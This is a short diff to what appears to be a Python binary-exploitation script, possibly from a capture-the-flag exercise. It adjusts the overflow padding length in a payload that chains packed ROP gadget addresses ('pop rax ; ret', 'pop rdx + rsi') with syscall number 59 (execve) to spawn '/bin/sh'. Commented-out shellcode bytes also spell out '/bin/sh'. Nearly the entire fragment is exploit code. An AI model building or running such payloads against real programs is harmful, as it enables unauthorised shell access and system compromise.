@@ -31,7 +31,7 @@ for i in range(1,37) :
 # shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
 # shellcode += struct.pack('<p',"'/bin/sh',0")
 shellcode += struct.pack('<q', d6)
-shellcode += 'A'*(994)
+shellcode += 'A'*(998)
 shellcode += struct.pack('<q', g1)#pop rax ; ret
 shellcode += struct.pack('<q', d1) #59
 shellcode += struct.pack('<q', g2)#pop rdx + rsi
